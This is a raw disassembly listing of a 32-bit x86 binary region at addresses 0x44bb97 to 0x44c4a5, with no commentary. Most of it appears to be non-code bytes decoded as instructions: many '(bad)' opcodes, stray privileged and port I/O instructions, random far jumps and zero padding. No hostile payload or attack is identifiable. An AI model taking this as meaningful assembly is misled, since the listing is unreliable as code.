  44bb97:	push   ebp
  44bb98:	mov    bh,0xd3
  44bb9a:	clc    
  44bb9b:	outs   dx,DWORD PTR ds:[esi]
  44bb9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44bb9d:	sar    eax,cl
  44bb9f:	aaa    
  44bba0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44bba1:	sar    eax,cl
  44bba3:	or     esi,DWORD PTR [esi-0x49d0072d]
  44bba9:	sar    eax,cl
  44bbab:	aad    0xa7
  44bbad:	sar    eax,cl
  44bbaf:	shl    DWORD PTR [edi-0x35ff072d],0x9a
  44bbb6:	sti    
  44bbb7:	jmp    FWORD PTR [edx]
  44bbb9:	cdq    
  44bbba:	sti    
  44bbbb:	inc    DWORD PTR [ecx+ebx*4-0x5]
  44bbbf:	(bad)  
  44bbc0:	jl     0x44bb5b
  44bbc2:	sti    
  44bbc3:	jmp    DWORD PTR [edx-0x67]
  44bbc6:	sti    
  44bbc7:	call   DWORD PTR [esi-0x67]
  44bbca:	sti    
  44bbcb:	inc    DWORD PTR [eax]
	...
  44bbe9:	add    BYTE PTR [eax-0x67],al
  44bbec:	sti    
  44bbed:	push   DWORD PTR [edx+0x6efffb99]
  44bbf3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44bbf4:	sti    
  44bbf5:	(bad)  
  44bbf6:	jp     0x44bb9d
  44bbf8:	sti    
  44bbf9:	jmp    esp
  44bbfb:	add    eax,DWORD PTR [eax]
  44bbfd:	add    BYTE PTR [eax],al
  44bbff:	jne    0x44bbfc
  44bc01:	(bad)  
  44bc02:	cmp    BYTE PTR [ebp-0x5],dh
  44bc05:	call   DWORD PTR [eax+0x75]
  44bc08:	sti    
  44bc09:	call   DWORD PTR [esi+0x75]
  44bc0c:	sti    
  44bc0d:	(bad)  
  44bc0e:	js     0x44bc85
  44bc10:	sti    
  44bc11:	push   DWORD PTR [eax+0x75]
  44bc14:	sti    
  44bc15:	(bad)  
  44bc16:	jl     0x44bc8d
  44bc18:	sti    
  44bc19:	push   DWORD PTR [esi+0x75]
  44bc1c:	sti    
  44bc1d:	inc    edx
  44bc1f:	jne    0x44bc1c
  44bc21:	call   FWORD PTR [ebp+esi*2+0x77befffb]
  44bc28:	sti    
  44bc29:	push   DWORD PTR [eax+0x77]
  44bc2c:	sti    
  44bc2d:	(bad)  
  44bc2e:	jp     0x44bca7
  44bc30:	sti    
  44bc31:	call   DWORD PTR [edi+esi*2+0x76fefffb]
  44bc38:	sti    
  44bc39:	(bad)  
  44bc3a:	ds ja  0x44bc38
  44bc3d:	dec    edx
  44bc3f:	jbe    0x44bc3c
  44bc41:	jmp    DWORD PTR [eax]
  44bc43:	ja     0x44bc40
  44bc45:	jmp    FWORD PTR [esi+esi*2-0x5]
  44bc49:	dec    DWORD PTR ds:0xfc9777
	...
  44bc6b:	add    BYTE PTR [edx-0x35],dl
  44bc6e:	xchg   ecx,eax
  44bc6f:	cld    
  44bc70:	dec    edx
  44bc71:	mov    ebp,0xd942fc91
  44bc76:	cld    
  44bc77:	dec    DWORD PTR ds:0x8d000406
  44bc7d:	stos   DWORD PTR es:[edi],eax
  44bc7e:	cld    
  44bc7f:	dec    DWORD PTR [ebp+0x22fc8f5f]
  44bc85:	stos   BYTE PTR es:[edi],al
  44bc86:	cld    
  44bc87:	dec    DWORD PTR [ebp-0x72000323]
  44bc8d:	aad    0xfc
  44bc8f:	dec    DWORD PTR [ebp-0x72000322]
  44bc95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44bc96:	cld    
  44bc97:	dec    DWORD PTR [ebp-0x72000325]
  44bc9d:	lods   al,BYTE PTR ds:[esi]
  44bc9e:	nop
  44bc9f:	cld    
  44bca0:	jmp    0x8eea:0xe2fc90da
  44bca7:	cld    
  44bca8:	(bad)  
  44bcaa:	mov    ?,esp
  44bcac:	shr    dh,cl
  44bcae:	mov    ?,esp
  44bcb0:	retf   0x8f44
  44bcb3:	cld    
  44bcb4:	ret    0xfcb3
  44bcb7:	dec    DWORD PTR [ebp-0x4d0370be]
  44bcbd:	in     eax,0xfc
  44bcbf:	dec    DWORD PTR [ebp-0x5d036fb4]
  44bcc5:	(bad)  
  44bcc6:	cld    
  44bcc7:	dec    DWORD PTR [ebp-0x72fffbd4]
  44bccd:	enter  0xfffc,0x0
	...
  44bced:	add    BYTE PTR [ebp-0x72000326],cl
  44bcf3:	mov    ch,0xfc
  44bcf5:	dec    DWORD PTR [ebp+0x72fc8f0e]
  44bcfb:	or     BYTE PTR [eax+eax*1],al
  44bcfe:	(bad)  
  44bcff:	jmp    ebp
  44bd01:	add    ecx,DWORD PTR ds:0xd03f580
  44bd07:	and    bl,0x3
  44bd0a:	or     eax,0xd03e780
  44bd0f:	and    dh,0x3
  44bd12:	or     eax,0x3994f300
  44bd17:	into   
  44bd18:	lock xchg esp,eax
  44bd1a:	xor    esi,ecx
  44bd1c:	pop    esi
  44bd1d:	xchg   esp,eax
  44bd1e:	sub    esi,ecx
  44bd20:	je     0x44bcb6
  44bd22:	and    esi,ecx
  44bd24:	js     0x44bcba
  44bd26:	sbb    esi,ecx
  44bd28:	jle    0x44bcbe
  44bd2a:	adc    esi,ecx
  44bd2c:	xchg   esp,eax
  44bd2d:	xchg   esp,eax
  44bd2e:	or     esi,ecx
  44bd30:	adc    BYTE PTR [ecx+eax*1-0x66bdf32],0xcd
  44bd38:	push   ss
  44bd39:	xchg   esp,eax
  44bd3a:	icebp  
  44bd3b:	int    0x10
  44bd3d:	xchg   esp,eax
  44bd3e:	jmp    0xe1d8c410
  44bd43:	int    0x8
  44bd45:	xchg   esp,eax
  44bd46:	fxch   st(5)
  44bd48:	adc    dl,BYTE PTR [ecx+edx*8-0x36648b33]
  44bd4f:	int    0xe6
  44bd51:	add    eax,DWORD PTR [eax]
	...
  44bd6f:	add    BYTE PTR ds:0xb9918f00,cl
  44bd75:	int    0x98
  44bd77:	xchg   ecx,eax
  44bd78:	mov    cl,0xcd
  44bd7a:	test   al,0x91
  44bd7c:	test   eax,0xa19612cd
  44bd81:	int    0xfe
  44bd83:	xchg   ebp,eax
  44bd84:	cdq    
  44bd85:	int    0xde
  44bd87:	xchg   ebp,eax
  44bd88:	xchg   ecx,eax
  44bd89:	int    0xd0
  44bd8b:	xchg   ebp,eax
  44bd8c:	mov    ebp,ecx
  44bd8e:	retf   0x8195
  44bd91:	int    0xaa
  44bd93:	xchg   ebp,eax
  44bd94:	jns    0x44bd63
  44bd96:	(bad)  
  44bd97:	call   0xbe44bdaa
  44bd9c:	or     eax,0xbd1b6732
  44bda1:	push   eax
  44bda2:	pop    edi
  44bda3:	or     eax,0x1d695e21
  44bda8:	in     al,dx
  44bda9:	sub    dh,BYTE PTR [ecx+ebp*8+0xe]
  44bdad:	push   0xffffffff
  44bdaf:	sub    ebx,ebx
  44bdb1:	pusha  
  44bdb2:	pop    edi
  44bdb3:	cmc    
  44bdb4:	lods   eax,DWORD PTR ds:[esi]
  44bdb5:	cmp    BYTE PTR [ebx-0x3],dh
  44bdb8:	lods   eax,DWORD PTR ds:[esi]
  44bdb9:	inc    edi
  44bdba:	push   ecx
  44bdbb:	jmp    0xbe4892ce
  44bdc0:	test   eax,0xa7a77464
  44bdc5:	pop    ebp
  44bdc6:	dec    ebp
  44bdc7:	shl    BYTE PTR [esi+ebx*2+0x2e57c46c],0x66
  44bdcf:	int3   
  44bdd0:	imul   edx,DWORD PTR [eax+eax*1+0x5a],0x0
	...
  44bdf1:	add    BYTE PTR [ebx],dl
  44bdf3:	aas    
  44bdf4:	arpl   WORD PTR [ebp-0x3da29ade],di
  44bdfa:	push   ebx
  44bdfb:	push   edi
  44bdfc:	jae    0x44bd95
  44bdfe:	push   edx
  44bdff:	add    BYTE PTR [eax],al
  44be01:	pushf  
  44be02:	adc    esi,DWORD PTR [edi]
  44be04:	jo     0x44bd92
  44be06:	cmp    DWORD PTR fs:[ebx-0x6b],esi
  44be0a:	sub    eax,0xee95148
  44be0f:	into   
  44be10:	(bad)  
  44be11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44be12:	sub    eax,0x5b884c54
  44be17:	push   esp
  44be18:	inc    ebx
  44be19:	jnp    0x44be5b
  44be1b:	push   edi
  44be1c:	outs   dx,BYTE PTR ds:[esi]
  44be1d:	jmp    0x3b419430
  44be22:	sub    al,0x5c
  44be24:	arpl   WORD PTR [eax+0x3a],cx
  44be27:	popa   
  44be28:	dec    ebx
  44be29:	push   esp
  44be2a:	frstor [eax+0x78]
  44be2d:	add    BYTE PTR [eax+eax*1+0x4a],dh
  44be31:	add    BYTE PTR [edi],ah
  44be33:	pop    eax
  44be34:	addr16 jae 0x44bdf8
  44be37:	cmp    ebx,DWORD PTR [ecx+0x6e]
  44be3a:	rcl    BYTE PTR [edi+0x5d],1
  44be3d:	add    bl,dh
  44be3f:	add    edi,DWORD PTR [edi]
  44be41:	add    BYTE PTR gs:[ebp+0x67],al
  44be45:	ins    DWORD PTR es:[edi],dx
  44be46:	or     DWORD PTR [ebx+0x66],esp
  44be49:	sub    BYTE PTR fs:[ebx+0x66],bl
  44be4d:	and    eax,DWORD PTR gs:[ebx*1+0x745ef302]
  44be55:	dec    esi
	...
  44be72:	add    BYTE PTR [eax],al
  44be74:	add    eax,0x11766130
  44be79:	adc    eax,0x5f407371
  44be7e:	gs dec ecx
  44be80:	dec    edx
  44be81:	pop    esi
  44be82:	addr16 add bh,dl
  44be85:	add    edi,DWORD PTR [edi]
  44be87:	gs loopne 0x44be95
  44be8a:	push   0x69
  44be8c:	ret    0x5460
  44be8f:	jns    0x44be45
  44be91:	pusha  
  44be92:	dec    edi
  44be93:	add    dl,cl
  44be95:	add    eax,0x12a0653f
  44be9a:	jno    0x44bf0f
  44be9c:	and    BYTE PTR [eax+0x65],0x44
  44bea0:	xchg   ecx,eax
  44bea1:	popa   
  44bea2:	pop    ecx
  44bea3:	jne    0x44be2d
  44bea5:	cmp    ecx,DWORD PTR [ebp+0x49]
  44bea8:	test   al,0x64
  44beaa:	addr16 inc cx
  44bead:	fs pop edi
  44beaf:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  44beb1:	inc    DWORD PTR [eax]
  44beb3:	add    ah,BYTE PTR [ebx+0x60]
  44beb6:	je     0x44bf04
  44beb8:	sub    ebx,DWORD PTR [esi+0x61]
  44bebb:	arpl   WORD PTR [ebp+0x58],dx
  44bebe:	inc    esp
  44bebf:	jb     0x44befe
  44bec1:	cs pop ebp
  44bec3:	jae    0x44bed2
  44bec5:	frndint 
  44bec7:	dec    ebp
  44bec8:	mov    cr3,ecx
  44becb:	je     0x44beaa
  44becd:	push   es
  44bece:	addr16 pop ebp
  44bed0:	lock add eax,0x43e45453
  44bed6:	pop    ecx
  44bed7:	ins    DWORD PTR es:[edi],dx
	...
  44bef4:	add    BYTE PTR [eax],al
  44bef6:	or     eax,0xe84102b5
  44befb:	in     al,dx
  44befc:	inc    eax
  44befd:	imul   esi,ecx,0xcb6367f3
  44bf03:	jmp    DWORD PTR [edi+0x63]
  44bf06:	fcomi  st,st(7)
  44bf08:	pusha  
  44bf09:	arpl   dx,bx
  44bf0b:	fdivr  st,st(4)
  44bf0d:	cmp    eax,0x7452fd10
  44bf12:	mov    edi,0xc27060f5
  44bf17:	fdivr  st,st(4)
  44bf19:	dec    ecx
  44bf1a:	or     BYTE PTR [ebp-0x43608bad],dh
  44bf20:	pop    ecx
  44bf21:	push   0xffffffba
  44bf23:	fdivr  st,st(4)
  44bf25:	mov    edi,0x6960a20f
  44bf2a:	outs   dx,DWORD PTR ds:[esi]
  44bf2b:	mov    eax,0xbc704b60
  44bf30:	outs   dx,BYTE PTR ds:[si]
  44bf32:	je     0x44bf9a
  44bf34:	dec    eax
  44bf35:	pop    edi
  44bf36:	popa   
  44bf37:	xchg   esp,eax
  44bf38:	push   ebx
  44bf39:	inc    ebx
  44bf3a:	gs frndint 
  44bf3d:	cdq    
  44bf3e:	cpuid  
  44bf40:	pop    ecx
  44bf41:	je     0x44bf7b
  44bf43:	pop    cx
  44bf45:	outs   dx,BYTE PTR ds:[esi]
  44bf46:	push   ecx
  44bf47:	test   BYTE PTR [esi+0x5f],bl
  44bf4a:	cmp    BYTE PTR [ebp+0x48],dh
  44bf4d:	push   ebx
  44bf4e:	inc    esp
  44bf4f:	popf   
  44bf50:	pop    ebp
  44bf51:	push   0x2a
  44bf53:	dec    esp
  44bf54:	pop    esi
  44bf55:	popa   
  44bf56:	xor    cl,bl
  44bf58:	cld    
  44bf59:	leave  
	...
  44bf76:	add    BYTE PTR [eax],al
  44bf78:	or     al,0x0
  44bf7a:	sub    bl,BYTE PTR [edi+0x21]
  44bf7d:	inc    esp
  44bf7e:	push   eax
  44bf7f:	push   ebp
  44bf80:	sub    BYTE PTR [edx+0x55],al
  44bf83:	pop    edi
  44bf84:	out    dx,al
  44bf85:	cs push edi
  44bf87:	arpl   ax,sp
  44bf89:	fs sub al,0x5c
  44bf8c:	fdiv   st(7),st
  44bf8e:	cs jmp esi
  44bf91:	dec    esi
  44bf92:	cmp    edx,DWORD PTR [esi-0x38]
  44bf95:	dec    edi
  44bf96:	xor    BYTE PTR [ecx],dh
  44bf98:	or     eax,0xcc054a00
  44bf9d:	adc    esi,DWORD PTR fs:[edx]
  44bfa0:	in     al,0x5b
  44bfa2:	sbb    al,0x67
  44bfa4:	scas   al,BYTE PTR es:[edi]
  44bfa5:	cmp    cl,bh
  44bfa7:	popa   
  44bfa8:	mov    ah,0x4d
  44bfaa:	adc    al,0x63
  44bfac:	rcr    DWORD PTR [eax+0xa],0x6a
  44bfb0:	fdiv   st(7),st
  44bfb2:	daa    
  44bfb3:	push   DWORD PTR [esi-0x3faa0cb2]
  44bfb9:	pop    esp
  44bfba:	xlat   BYTE PTR ds:[ebx]
  44bfbb:	inc    edx
  44bfbc:	or     eax,0xa6feac00
  44bfc1:	dec    esi
  44bfc2:	fist   DWORD PTR [ebp+0x79]
  44bfc5:	arpl   WORD PTR [ecx-0x45fff2be],di
  44bfcb:	add    eax,0x34b3634c
  44bfd0:	jp     0x44c01f
  44bfd2:	mov    ebx,0xc034765e
  44bfd7:	data16 outs dx,BYTE PTR ds:[esi]
  44bfd9:	add    BYTE PTR [eax],al
  44bfdb:	add    eax,DWORD PTR [eax]
	...
  44bff9:	add    BYTE PTR [esi+0x48],cl
  44bffc:	nop
  44bffd:	dec    edi
  44bffe:	cmp    eax,0x2e64824e
  44c003:	dec    ebp
  44c004:	xchg   esi,eax
  44c005:	add    esp,DWORD PTR [ebx-0x1]
  44c008:	test   al,0x55
  44c00a:	arpl   WORD PTR cs:[ebx+0x4e536a],bp
  44c011:	mov    BYTE PTR [eax+0x51],al
  44c014:	add    BYTE PTR [eax+0xe],ch
  44c017:	or     ebp,DWORD PTR [esi+0x4c]
  44c01a:	xor    BYTE PTR [ebx+eiz*2+0x25],dl
  44c01e:	and    BYTE PTR [edx+0x63],bl
  44c021:	dec    edx
  44c022:	fst    QWORD PTR [esi+0x6e]
  44c025:	push   eax
  44c026:	xor    al,BYTE PTR [eax]
  44c028:	add    BYTE PTR [eax],ah
  44c02a:	or     eax,0xcc35633b
  44c02f:	dec    ebp
  44c030:	arpl   WORD PTR [edi-0x43],ax
  44c033:	(bad)  
  44c034:	(bad)  
  44c035:	in     eax,dx
  44c036:	(bad)  
  44c038:	imul   ecx,DWORD PTR [eax],0xb673bed
  44c03e:	mov    edi,0xfa106e28
  44c043:	(bad)  
  44c044:	jmp    DWORD PTR [ebx]
  44c046:	(bad)  
  44c048:	arpl   bp,di
  44c04a:	(bad)  
  44c04b:	pop    ecx
  44c04c:	imul   ecx,DWORD PTR [edx],0xfb6463c8
  44c052:	lods   eax,DWORD PTR ds:[esi]
  44c053:	pop    edx
  44c054:	ins    DWORD PTR es:[edi],dx
  44c055:	jmp    0xbe489468
  44c05a:	jmp    0x0:0xc4413a
	...
  44c079:	add    BYTE PTR [eax],al
  44c07b:	add    dl,al
  44c07d:	or     BYTE PTR [ebp-0x23],bl
  44c080:	jns    0x44c0d0
  44c082:	arpl   WORD PTR [edx-0x2992a995],bp
  44c088:	jb     0x44c0e7
  44c08a:	dec    ebp
  44c08b:	les    ebx,FWORD PTR [edi+0x5b]
  44c08e:	addr16 (bad) 
  44c090:	jo     0x44c0d3
  44c092:	fs jmp 0x9547fda6
  44c098:	aas    
  44c099:	push   esp
  44c09a:	outs   dx,BYTE PTR ds:[esi]
  44c09b:	mov    ah,BYTE PTR [ebp+0x50]
  44c09e:	addr16 mov esi,0xa9ff8d0e
  44c0a4:	pop    esp
  44c0a5:	pop    ebp
  44c0a6:	pop    edi
  44c0a7:	add    BYTE PTR [eax],bh
  44c0a9:	pusha  
  44c0aa:	push   esp
  44c0ab:	push   0x64596036
  44c0b0:	mov    ah,0xfc
  44c0b2:	dec    esi
  44c0b3:	add    eax,DWORD PTR [ecx+0x3d567063]
  44c0b9:	pop    edi
  44c0ba:	outs   dx,DWORD PTR ds:[esi]
  44c0bb:	dec    edi
  44c0bc:	dec    edx
  44c0bd:	or     ah,BYTE PTR [ecx+0x6c]
  44c0c0:	fld    DWORD PTR [ebx]
  44c0c2:	into   
  44c0c3:	add    al,0x39
  44c0c5:	bound  esp,QWORD PTR [ebp+0x61]
  44c0c8:	xor    al,0x1a
  44c0ca:	popa   
  44c0cb:	cmp    eax,DWORD PTR gs:[ecx+0x5e]
  44c0cf:	inc    esi
  44c0d0:	int    0x57
  44c0d2:	pop    ebp
  44c0d3:	add    BYTE PTR [esp+edi*8+0x6309723a],cl
  44c0da:	je     0x44c141
  44c0dc:	adc    al,0x2e
  44c0de:	arpl   WORD PTR [bx+si],ax
	...
  44c0fd:	add    BYTE PTR [ecx],bl
  44c0ff:	sub    eax,0xfc34576b
  44c104:	mov    eax,DWORD PTR [eax]
  44c106:	out    0x2d,eax
  44c108:	pop    ebp
  44c109:	popa   
  44c10a:	cmp    BYTE PTR [edi+0x3e],bl
  44c10d:	imul   edx,DWORD PTR [eax],0x2461455f
  44c113:	sub    al,0x61
  44c115:	outs   dx,BYTE PTR ds:[esi]
  44c116:	dec    ebx
  44c117:	sbb    DWORD PTR [eax],eax
  44c119:	add    BYTE PTR [esp+edi*8+0x5fe47543],bh
  44c120:	popa   
  44c121:	arpl   bp,dx
  44c123:	aaa    
  44c124:	pop    ebp
  44c125:	dec    eax
  44c126:	lds    ebx,FWORD PTR [ebp+0x64]
  44c129:	ins    BYTE PTR es:[edi],dx
  44c12a:	leave  
  44c12b:	add    ecx,DWORD PTR [eax+0x3]
  44c12e:	mov    al,0x5e
  44c130:	pop    ebx
  44c131:	popa   
  44c132:	mov    al,ds:0x89656a05
  44c137:	add    ecx,DWORD PTR [ebx]
  44c139:	add    al,0x96
  44c13b:	pusha  
  44c13c:	imul   esi,DWORD PTR [ebp+0xd],0x7c
  44c140:	pop    edi
  44c141:	push   esp
  44c142:	xor    eax,0x315f5f6b
  44c147:	frndint 
  44c149:	lock seto BYTE PTR [ebp+0x3e]
  44c14e:	sub    al,0x75
  44c150:	arpl   WORD PTR cs:[edi*2-0x26e08bd4],bp
  44c158:	cld    
  44c159:	jmp    0x2401:0x6e650f09
  44c160:	pop    ebp
  44c161:	ins    BYTE PTR es:[edi],dx
	...
  44c17e:	add    BYTE PTR [eax],al
  44c180:	retf   
  44c181:	sub    bl,BYTE PTR [ecx+0x63]
  44c184:	rol    BYTE PTR [eax+0x4],1
  44c187:	out    0x9,al
  44c189:	out    dx,eax
  44c18a:	outs   dx,BYTE PTR fs:[esi]
  44c18c:	loope  0x44c191
  44c18e:	pop    ebp
  44c18f:	ins    BYTE PTR es:[edi],dx
  44c190:	int3   
  44c191:	add    al,0x68
  44c193:	imul   ebp,esi,0xd005c13
  44c199:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44c19a:	dec    DWORD PTR [ebx-0x46]
  44c19d:	neg    DWORD PTR [edi+0x4c]
  44c1a0:	mov    ah,0xfa
  44c1a2:	dec    ebp
  44c1a3:	pop    edi
  44c1a4:	mov    edi,0xd003cff
  44c1a9:	mov    bh,0xf9
  44c1ab:	push   eax
  44c1ac:	lahf   
  44c1ad:	dec    DWORD PTR [edi+0x63]
  44c1b0:	mov    ebp,0xb05d63ca
  44c1b5:	test   eax,0xb3a84b4f
  44c1ba:	arpl   WORD PTR [esi-0x7c],bp
  44c1bd:	frndint 
  44c1bf:	ret    
  44c1c0:	or     al,0x9e
  44c1c2:	pop    ecx
  44c1c3:	je     0x44c213
  44c1c5:	test   BYTE PTR [esi+0x6e],cl
  44c1c8:	push   0x755448b7
  44c1cd:	mov    ebx,DWORD PTR [ecx+0x5f]
  44c1d0:	imul   ebx,ecx,0x11adfc
  44c1d6:	mov    dh,0x67
  44c1d8:	outs   dx,BYTE PTR ds:[esi]
  44c1d9:	pop    ebp
  44c1da:	xchg   edi,eax
  44c1db:	add    esp,DWORD PTR [edx+0x395eb5fb]
  44c1e1:	sub    al,0x7f
  44c1e3:	push   ecx
	...
  44c200:	add    BYTE PTR [eax],al
  44c202:	cs popa 
  44c204:	mov    esi,DWORD PTR [ebx]
  44c206:	and    ebx,DWORD PTR [ecx-0x76]
  44c209:	push   ecx
  44c20a:	xor    cl,BYTE PTR [eax+esi*2+0x3]
  44c20e:	push   eax
  44c20f:	cld    
  44c210:	xchg   ebp,eax
  44c211:	pop    esi
  44c212:	and    DWORD PTR ds:0x5e446051,edi
  44c218:	and    DWORD PTR [ebx-0x7],ebp
  44c21b:	pop    esp
  44c21c:	out    0x3,eax
  44c21e:	in     al,dx
  44c21f:	sti    
  44c220:	xor    eax,0x503e015f
  44c225:	push   0x6b4a2fee
  44c22a:	test   DWORD PTR [ebx+0x4c],0xe747ce52
  44c231:	add    esi,ebp
  44c233:	add    DWORD PTR [edx],ebp
  44c235:	pop    edi
  44c236:	fnstenv [edx+ecx*1]
  44c239:	pusha  
  44c23a:	mov    esi,0xe24c0c53
  44c23f:	push   ebp
  44c240:	add    ebp,DWORD PTR [eax-0x52]
  44c243:	cs out 0x3,eax
  44c246:	stos   DWORD PTR es:[edi],eax
  44c247:	sti    
  44c248:	adc    eax,0x3da15f
  44c24d:	push   0x67002bae
  44c252:	scas   al,BYTE PTR es:[edi]
  44c253:	dec    DWORD PTR [ebx]
  44c255:	(bad)  
  44c256:	mov    ebp,0x6e4fd051
  44c25b:	shl    BYTE PTR ds:[edi+0x6e],0x0
  44c260:	cmp    eax,0xbb5b4c02
  44c265:	cmp    eax,0x0
	...
  44c282:	add    BYTE PTR [eax],al
  44c284:	push   0x54
  44c286:	les    eax,FWORD PTR [edx+0x61]
  44c289:	dec    esp
  44c28a:	add    BYTE PTR [ebx-0x4a8cd989],bh
  44c290:	cmp    edx,DWORD PTR [ebx+0x51]
  44c293:	jmp    0xbb4182a6
  44c298:	imul   esp,DWORD PTR ds:0x5437af64,0x63
  44c29f:	jmp    0xaa4439b2
  44c2a4:	pop    esp
  44c2a5:	popa   
  44c2a6:	pop    edi
  44c2a7:	jne    0x44c2f4
  44c2a9:	inc    edx
  44c2aa:	test   DWORD PTR [bp+di+0x2f],eax
  44c2ae:	add    BYTE PTR [esi+0x5c6c420f],dl
  44c2b4:	cmp    bl,BYTE PTR [eax+0x42]
  44c2b7:	push   eax
  44c2b8:	in     eax,dx
  44c2b9:	pusha  
  44c2ba:	ds pop esp
  44c2bc:	mul    DWORD PTR [ecx+0x63]
  44c2bf:	pop    ebx
  44c2c0:	loop   0x44c2c1
  44c2c2:	push   DWORD PTR [edi+0x35633f08]
  44c2c8:	xlat   BYTE PTR ds:[ebx]
  44c2c9:	pop    esp
  44c2ca:	ins    BYTE PTR es:[edi],dx
  44c2cb:	dec    esp
  44c2cc:	sbb    bl,BYTE PTR [ebp+0x76]
  44c2cf:	inc    esp
  44c2d0:	les    eax,FWORD PTR [edi+0x0]
  44c2d3:	sbb    al,BYTE PTR ds:0xcd156333
  44c2d9:	and    al,0x6d
  44c2db:	sbb    eax,0xfe6e55d4
  44c2e0:	loopne 0x44c2e1
  44c2e2:	(bad)  
  44c2e3:	jp     0x44c2ed
  44c2e5:	aas    
  44c2e6:	arpl   bp,si
	...
  44c304:	add    BYTE PTR [eax],al
  44c306:	aam    0x5c
  44c308:	ins    BYTE PTR es:[edi],dx
  44c309:	or     al,0xe5
  44c30b:	pop    esp
  44c30c:	imul   eax,DWORD PTR [ecx+edx*1],0xffffffb2
  44c310:	jmp    FWORD PTR [ebp+eiz*4+0x75d56353]
  44c317:	inc    edx
  44c318:	lds    esi,FWORD PTR [di+0x2f]
  44c31c:	add    BYTE PTR ds:0x633f10,bh
  44c322:	mov    al,0x36
  44c324:	popa   
  44c325:	ins    BYTE PTR es:[edi],dx
  44c326:	rol    DWORD PTR [ebx],1
  44c328:	data16 retfw 
  44c32b:	sub    ah,BYTE PTR [ebp+0x61]
  44c32e:	mov    al,ds:0xa66e6723
  44c333:	xor    ecx,DWORD PTR [eax+0x61]
  44c336:	call   0x5900:0xb4656c5c
  44c33d:	add    al,0x77
  44c33f:	push   edi
  44c340:	je     0x44c388
  44c342:	popf   
  44c343:	and    al,0x5d
  44c345:	inc    ecx
  44c346:	and    BYTE PTR ds:0x2796696a,ch
  44c34c:	je     0x44c3b3
  44c34e:	pop    ss
  44c34f:	or     al,BYTE PTR [eax]
  44c351:	add    dh,al
  44c353:	cli    
  44c354:	inc    eax
  44c355:	outs   dx,BYTE PTR ds:[esi]
  44c356:	frstor [edi]
  44c358:	popa   
  44c359:	popa   
  44c35a:	enter  0x7222,0x65
  44c35e:	daa    
  44c35f:	cs popa 
  44c361:	je     0x44c340
  44c363:	pop    esp
  44c364:	pop    ecx
  44c365:	ins    BYTE PTR es:[edi],dx
  44c366:	pop    es
  44c367:	push   edi
  44c368:	pop    ebx
  44c369:	je     0x44c36b
	...
  44c387:	add    ch,cl
  44c389:	pusha  
  44c38a:	data16 add BYTE PTR [ebp-0x3],bl
  44c38e:	dec    ebx
  44c38f:	gs add eax,0x26435d2a
  44c395:	and    esi,DWORD PTR [ecx+ebp*2+0x17]
  44c399:	pop    ebx
  44c39a:	ins    BYTE PTR es:[edi],dx
  44c39b:	push   ebx
  44c39c:	adc    DWORD PTR [ebp+0x74],ebx
  44c39f:	imul   ebx,DWORD PTR [ebx],0x9a000062
  44c3a5:	add    BYTE PTR ds:0x6a57206e,bh
  44c3ab:	inc    ebx
  44c3ac:	push   ss
  44c3ad:	and    esi,DWORD PTR [ecx+ebp*2+0x47]
  44c3b1:	pop    ebx
  44c3b2:	ins    BYTE PTR es:[edi],dx
  44c3b3:	push   ebx
  44c3b4:	rcr    DWORD PTR [edx+0x74],1
  44c3b7:	imul   ecx,DWORD PTR ds:0xd005eba,0x6843fd08
  44c3c1:	lods   eax,DWORD PTR ds:[esi]
  44c3c2:	addr16 je 0x44c435
  44c3c5:	xchg   esi,eax
  44c3c6:	push   edx
  44c3c7:	addr16 pop ecx
  44c3c9:	shl    BYTE PTR [ecx+0x5f],0x69
  44c3cd:	addr16 pop bp
  44c3d0:	pop    ecx
  44c3d1:	jo     0x44c430
  44c3d3:	push   0xd
  44c3d5:	loopne 0x44c3da
  44c3d7:	inc    edx
  44c3d8:	xor    al,0x7b
  44c3da:	pusha  
  44c3db:	inc    edx
  44c3dc:	and    al,0x67
  44c3de:	push   ecx
  44c3df:	je     0x44c42c
  44c3e1:	jo     0x44c43b
  44c3e3:	arpl   WORD PTR [edx-0x27],ax
  44c3e6:	cld    
  44c3e7:	sub    DWORD PTR [ebx+edx*4],ecx
  44c3ea:	pop    ebx
  44c3eb:	push   0x0
	...
  44c409:	add    BYTE PTR [ecx],dh
  44c40b:	xchg   esi,eax
  44c40c:	pop    eax
  44c40d:	imul   ebx,DWORD PTR [esi],0xc430434
  44c413:	sbb    edx,DWORD PTR [ebp+0x6a]
  44c416:	jmp    0x1bd2535
  44c41b:	sbb    edx,DWORD PTR [ebp+0x6c]
  44c41e:	call   0xfc6c804
  44c423:	sbb    ah,BYTE PTR [ecx+0x74]
  44c426:	mov    ecx,0xec635240
  44c42b:	cmp    al,0x43
  44c42d:	imul   esp,ebx,0xc17860e4
  44c433:	fdivr  st,st(4)
  44c435:	mov    cs,WORD PTR [ecx]
  44c437:	push   es
  44c438:	popa   
  44c439:	je     0x44c41c
  44c43b:	add    BYTE PTR [edx+0x63],dl
  44c43e:	lods   al,BYTE PTR ds:[esi]
  44c43f:	hlt    
  44c440:	inc    edx
  44c441:	imul   edi,DWORD PTR [ebx-0x66879e34],0xf4bfcd8
  44c44b:	sbb    ah,BYTE PTR [ecx+0x74]
  44c44e:	mov    ebp,0x6860d4ff
  44c453:	pop    ebp
  44c454:	(bad)  
  44c455:	push   esp
  44c456:	dec    edx
  44c457:	pop    esp
  44c458:	out    0x3,eax
  44c45a:	mov    edx,0x6366b2fb
  44c45f:	push   ebp
  44c460:	shl    BYTE PTR [ecx+0x4a],1
  44c463:	dec    esp
  44c464:	les    esi,FWORD PTR [edi]
  44c466:	jne    0x44c4b6
  44c468:	int3   
  44c469:	bound  esi,QWORD PTR [ecx+0x0]
  44c46c:	xor    cl,BYTE PTR [eax]
	...
  44c48a:	add    BYTE PTR [eax],al
  44c48c:	cmp    al,0x61
  44c48e:	nop
  44c48f:	push   edi
  44c490:	dec    edi
  44c491:	push   ebx
  44c492:	xchg   ebp,eax
  44c493:	ds ds push esp
  44c496:	fwait
  44c497:	pop    edx
  44c498:	cmp    eax,0x53408454
  44c49d:	push   esi
  44c49e:	mov    WORD PTR [ecx+eiz*1+0x4f],fs
  44c4a2:	out    0x3,eax
  44c4a4:	into   
  44c4a5:	add    BYTE PTR [edx+0x743f2166],ch
